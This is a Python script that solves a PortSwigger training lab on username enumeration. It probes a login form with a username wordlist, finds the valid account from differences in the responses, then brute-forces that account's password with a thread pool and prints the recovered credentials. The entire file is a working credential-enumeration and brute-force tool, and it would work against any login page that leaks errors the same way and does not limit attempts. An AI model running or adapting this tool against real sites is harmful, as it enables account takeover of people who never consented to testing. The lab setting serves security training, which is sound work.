#!/usr/bin/env python3
"""
Solver for PortSwigger lab:
  "Username enumeration via different responses"
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

Two-phase attack:
  1. Probe each candidate username with a fixed junk password. The valid
     username produces a response that DIFFERS from the rest (different
     body length / error message). We fingerprint each response as
     (status, body length, error text) and pick the unique fingerprint.

  2. Take the discovered username and try each candidate password.
     A successful login responds with 302 -> /my-account instead of 200.

Replaces Burp Community Intruder, which is artificially throttled.
The lab does not rate-limit, so a small thread pool is plenty.

Usage:
    python3 username_enum_solver.py <lab-base-url> <usernames.txt> <passwords.txt>

Example:
    python3 username_enum_solver.py \\
        https://0a1b00...web-security-academy.net \\
        usernames.txt passwords.txt
"""

import argparse
import re
import sys
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter


# PortSwigger labs render the login error as: <p class=is-warning>Invalid username</p>
ERROR_RE = re.compile(r"<p\s+class=is-warning>([^<]+)</p>", re.IGNORECASE)


def build_session(workers: int) -> requests.Session:
    s = requests.Session()
    # Size the connection pool to the thread count so sockets get reused
    # instead of being torn down + rebuilt for every request.
    adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})
    return s


def post_login(session, base_url, username, password):
    return session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=20,
    )


def extract_error(html: str) -> str:
    m = ERROR_RE.search(html)
    return m.group(1).strip() if m else ""


def read_wordlist(path: Path) -> list[str]:
    return [w for w in (line.strip() for line in path.read_text().splitlines()) if w]


def enumerate_username(base_url, usernames, dummy_password, workers):
    print(f"[*] phase 1: probing {len(usernames)} usernames with {workers} workers")
    session = build_session(workers)
    results: dict[str, tuple[int, int, str]] = {}

    def probe(u):
        r = post_login(session, base_url, u, dummy_password)
        return u, r.status_code, len(r.content), extract_error(r.text)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        for fut in as_completed([ex.submit(probe, u) for u in usernames]):
            u, status, length, msg = fut.result()
            results[u] = (status, length, msg)

    # Fingerprint each response. The valid username is the odd one out.
    counts = Counter(results.values())
    unique = [fp for fp, c in counts.items() if c == 1]

    if not unique:
        print("[-] no outlier found — every response looked identical.")
        for u, fp in list(results.items())[:3]:
            print(f"    sample: {u!r} -> {fp}")
        return None

    if len(unique) > 1:
        print(f"[!] {len(unique)} outliers — server may be noisy. Candidates:")
        for fp in unique:
            for u, r in results.items():
                if r == fp:
                    print(f"    {u!r}  fingerprint={fp}")
        return None

    fingerprint = unique[0]
    valid = next(u for u, r in results.items() if r == fingerprint)

    # Also report the baseline so you can see what we keyed on.
    baseline = counts.most_common(1)[0][0]
    print(f"[+] valid username: {valid!r}")
    print(f"    outlier  : status={fingerprint[0]} len={fingerprint[1]} msg={fingerprint[2]!r}")
    print(f"    baseline : status={baseline[0]}  len={baseline[1]}  msg={baseline[2]!r}")
    return valid


def brute_password(base_url, username, passwords, workers):
    print(f"[*] phase 2: trying {len(passwords)} passwords against {username!r}")
    session = build_session(workers)

    found: str | None = None

    def probe(p):
        r = post_login(session, base_url, username, p)
        return p, r.status_code, r.headers.get("Location", "")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, p): p for p in passwords}
        for fut in as_completed(futures):
            p, status, location = fut.result()
            if status == 302:
                found = p
                print(f"[+] password found: {p!r}  -> redirect to {location!r}")
                # Cancel queued probes — won't stop in-flight ones, but
                # avoids hammering the lab after we've already won.
                for f in futures:
                    f.cancel()
                break

    return found


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("base_url", help="Lab base URL, e.g. https://0a1b...web-security-academy.net")
    ap.add_argument("usernames", type=Path, help="Path to username wordlist")
    ap.add_argument("passwords", type=Path, help="Path to password wordlist")
    ap.add_argument(
        "--dummy-password",
        default="not-a-real-password-xkcd-correct-horse-battery-staple-2026",
        help="Password used during the username-probing phase",
    )
    ap.add_argument("--workers", type=int, default=10, help="Concurrent requests (default 10)")
    args = ap.parse_args()

    parsed = urlparse(args.base_url)
    if not parsed.scheme or not parsed.netloc:
        sys.exit("base_url must include scheme + host, e.g. https://0a1b...web-security-academy.net")
    base = f"{parsed.scheme}://{parsed.netloc}"

    usernames = read_wordlist(args.usernames)
    passwords = read_wordlist(args.passwords)

    user = enumerate_username(base, usernames, args.dummy_password, args.workers)
    if not user:
        sys.exit(1)

    pw = brute_password(base, user, passwords, args.workers)
    if not pw:
        print("[-] no password matched.")
        sys.exit(1)

    print()
    print(f"=== credentials: {user}:{pw} ===")


if __name__ == "__main__":
    main()
